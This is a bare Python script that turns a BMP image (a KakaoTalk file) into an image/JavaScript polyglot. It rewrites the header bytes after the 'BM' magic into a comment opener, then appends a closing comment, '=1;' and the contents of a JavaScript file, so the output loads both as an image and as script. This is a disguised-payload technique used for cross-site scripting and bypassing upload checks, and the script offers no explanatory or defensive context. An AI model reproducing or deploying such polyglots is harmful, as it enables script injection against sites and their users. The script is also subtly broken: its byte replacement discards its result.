fname = "KakaoTalk_20180327_204057011.bmp"
generated_file = "hacked_image.bmp"
js_fname = "hello.js"

with open(fname, 'rb') as pfile:
    file_buffer = pfile.read()
    file_buffer.replace(b'\x2A\x2F', b'\x00\x00')

with open(generated_file, 'wb') as pfile:
    pfile.write(file_buffer)
    pfile.seek(2, 0)
    # go to after magic
    pfile.write(b'\x2F\x2A')

with open(generated_file, 'ab') as pfile: # continue
    pfile.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
    with open(js_fname, 'rb') as js_file:
        pfile.write(js_file.read())

